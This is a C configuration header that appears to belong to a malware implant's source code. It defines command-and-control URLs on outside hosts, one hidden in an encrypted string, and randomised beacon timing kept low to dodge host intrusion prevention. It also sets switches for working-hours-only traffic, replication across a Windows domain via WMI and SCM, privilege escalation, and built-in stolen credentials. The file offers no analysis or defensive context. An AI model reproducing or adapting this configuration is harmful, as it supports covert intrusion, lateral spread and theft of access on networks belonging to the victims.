/*
	config.h
	Shared project configuration file

*/




// name used as source for random generators used in object names. 
// Should be constant for all components inside one installation
#define TARGET_BUILDCHAIN_HASH HASHSTR_CONST("test environment", 0x7393c9a643eb4a76) 

// numeric id of build (word value) to distinct target networks one from another
// 1x - support.zakon-auto.net/tuning/
// 2x - mp3.ucrazy.org/music/
#define BUILD_ID 20


// defines a amount of seconds to wait before module will check network connectivity
// of a particular machine. Specified as a min-max range, a random value inside will be chosen
// to prevent timeframe identification of software startup.
// When delay finishes, network module attempts to query some urls
// for release mode, 10-60 mins range suggested
#define NETWORK_CHECK_ATTEMPT_DELAY_SEC_MIN 2
#define NETWORK_CHECK_ATTEMPT_DELAY_SEC_MAX 5


// if set to TRUE, remote network access will be issued only in usual working hours
// according to local clock (9-00(+lag) - 19-00)
// if undefined, this functionality will not be compiled at all
//#define PRESERVE_WORKHOURS_NETWORK_ACCESS TRUE


// values regulating amount and delays between networks requests. Should be reasonably low to avoid HIPS triggering
// used by WinHTTP transport. Actual values are randomly selected from specified range each check time
#ifndef _DEBUG

// RELEASE VALUES
#define MAX_QUERIES_IN_HOUR_MIN 10
#define MAX_QUERIES_IN_HOUR_MAX 25
#define WAIT_BETWEEN_QUERIES_SEC_MIN 8
#define WAIT_BETWEEN_QUERIES_SEC_MAX 80

#else

#define MAX_QUERIES_IN_HOUR_MIN 100000
#define MAX_QUERIES_IN_HOUR_MAX 250000
#define WAIT_BETWEEN_QUERIES_SEC_MIN 2
#define WAIT_BETWEEN_QUERIES_SEC_MAX 5

#endif

// amount of time (mins) a network thread should wait for in case of fQuery() attempt from transport failed
#define WAIT_MINUTES_IF_NETWORK_COMMUNICATION_FAILED 13

// how long tsgen should keep answer for remote queries from pipe clients without network access, in minutes
// after this time, answer will be removed from queue to free resources
#define REMOTE_CHUNK_ANSWER_TTL_MINS 20



// disables https connectivity check in winhttp transport, which sometimes fails on winxp in test environment with 12175 error at WinHttpSendRequest()
#define NO_HTTPS_ACCESS_CHECK_IN_TRANSPORT


// experimental - include privilege escalation at IDD
//#define DO_PRIVILEGE_ESCALATION


// mod_NetworkConnectivity, transport_Generic
// url of remote control center
#define DEBUG_CONTROL_URL	= L"http://denwer/pegasus/index.php";
#define RELEASE_CONTROL_URL	= CRSTRW("http://mp3.ucrazy.org/music/index.php", "\xfd\xff\x43\x04\xd8\xff\x4b\x18\xf9\xf7\xf9\xa3\x42\x0a\x93\x9f\x63\x32\xe0\xbe\x4c\x5d\xda\xc2\x62\x75\x24\x23\x80\x92\x10\x45\xae\xe8\x6a\x22\xc9\xc2\x5b\x42\xfd\xef\xb3");
// CRSTRW("http://support.zakon-auto.net/tuning/index.asp", "xxx");
// CRSTRW("http://video.tnt-online.info/tnt-comedy-tv/stream.php", "xxx");

// replication methods used
#define DOMAIN_REPLICATION_WMI
#define DOMAIN_REPLICATION_SCM
//#define DOMAIN_REPLICATION_RDP

// replication settings - timeframe to restart replication to gather new hosts, in minutes
#define REPLICATION_RESTART_MIN 20
#define REPLICATION_RESTART_MAX 60


// compile hardcoded creds, from target system (WorkDispatcher)
//#define ADD_BUILTIN_CREDS